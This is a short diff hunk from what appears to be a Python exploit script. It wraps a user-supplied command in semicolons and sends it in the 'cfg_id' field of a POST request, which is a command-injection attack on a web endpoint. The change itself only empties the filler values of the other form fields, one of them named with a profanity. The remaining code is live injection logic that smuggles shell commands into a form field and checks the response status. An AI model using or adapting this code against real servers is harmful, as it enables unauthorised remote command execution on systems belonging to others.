@@ -27,10 +27,10 @@ else:
         command = ";"+cmd+";"
         s = requests.Session()
         post_data = {
-            "idk" : "b %$##",
+            "idk" : "",
             "cfg_id": command,
-            "fuck": "%$$% &*^$*&^$*",
-            "a" : "^$ d"
+            "fuck": "",
+            "a" : ""
         }
         post_Request = s.post(url, data=post_data)
         if post_Request.status_code==200:
